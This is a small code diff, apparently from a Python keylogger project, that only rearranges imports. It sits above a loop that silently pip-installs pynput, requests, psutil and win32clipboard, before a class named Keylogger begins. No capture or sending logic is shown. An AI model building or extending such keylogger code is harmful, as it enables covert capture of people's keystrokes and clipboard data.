@@ -1,5 +1,11 @@
 import importlib.util
 import subprocess
+import socket
+import json
+import sqlite3
+import os
+
+import platform
 libs = ['pynput', 'requests', 'psutil', 'win32clipboard']
 for lib in libs:
     imported = importlib.util.find_spec(lib)
@@ -8,14 +14,10 @@ for lib in libs:
             subprocess.check_call(['pip','install',lib])
         except subprocess.CalledProcessError:
             pass
+
 from pynput.keyboard import Listener, Key, KeyCode
-import socket
-import os
-import sqlite3
 import requests
-import json
 import psutil
-import platform
 import win32clipboard
 
 class Keylogger:
